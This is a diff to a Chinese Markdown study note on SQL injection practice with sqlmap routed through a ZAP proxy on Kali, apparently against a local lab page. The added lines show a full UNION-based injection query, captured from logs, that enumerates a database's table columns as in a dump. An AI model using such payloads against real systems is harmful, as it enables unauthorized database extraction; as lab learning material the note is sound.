@@ -97,6 +97,10 @@ kali 自带 mysql，但后面还是打不开 1.php，试了好多办法还是不
 ```
 *--proxy='http://127.0.0.1:8080' 通过此代理，设置此项即可让请求通过 ZAP，可以抓到请求包*
 
+**这时看一下 ZAP/sql 查询记录** ，可以看到是用的 UNION 查询（这里以拖库时得查询为例）：
+
+SELECT username,password FROM user WHERE id='1' UNION ALL SELECT CONCAT(0x71787a7071,JSON_ARRAYAGG(CONCAT_WS(0x766c66726e63,column_name,column_type)),0x71706a7171),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x75736572 AND table_schema=0x73716c5f696e6a656374696f6e-- -'
+
 
 
 
@@ -116,11 +120,11 @@ kali 自带 mysql，但后面还是打不开 1.php，试了好多办法还是不
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzYxMDI5NjI5LDI4MDc4NDQ1MywxMTcwMz
-Q1ODk5LC0xNzExMzMyODU4LDc5NjI4MzEwOCw4ODk4MzI1OTQs
-MTgwMzUwMTQ4NiwtNjc0NjU0OTU4LDE1ODkwNDg1ODksLTE4NT
-g4NjI5NTcsLTE1NjYzNTQxNzAsMjcxOTkwNjM0LDIzOTc0NzIy
-NiwtMjA2ODc4ODUxMiwxNjQ4NTU2NjEwLC0xODAyMzc4MDYwLC
-0xOTE1NDI2OTUsLTU5ODkwMjE1LC0zNTkxOTU3OTcsMjMyMDgx
-NzNdfQ==
+eyJoaXN0b3J5IjpbLTM1NzUzNzM1MCwyODA3ODQ0NTMsMTE3MD
+M0NTg5OSwtMTcxMTMzMjg1OCw3OTYyODMxMDgsODg5ODMyNTk0
+LDE4MDM1MDE0ODYsLTY3NDY1NDk1OCwxNTg5MDQ4NTg5LC0xOD
+U4ODYyOTU3LC0xNTY2MzU0MTcwLDI3MTk5MDYzNCwyMzk3NDcy
+MjYsLTIwNjg3ODg1MTIsMTY0ODU1NjYxMCwtMTgwMjM3ODA2MC
+wtMTkxNTQyNjk1LC01OTg5MDIxNSwtMzU5MTk1Nzk3LDIzMjA4
+MTczXX0=
 -->
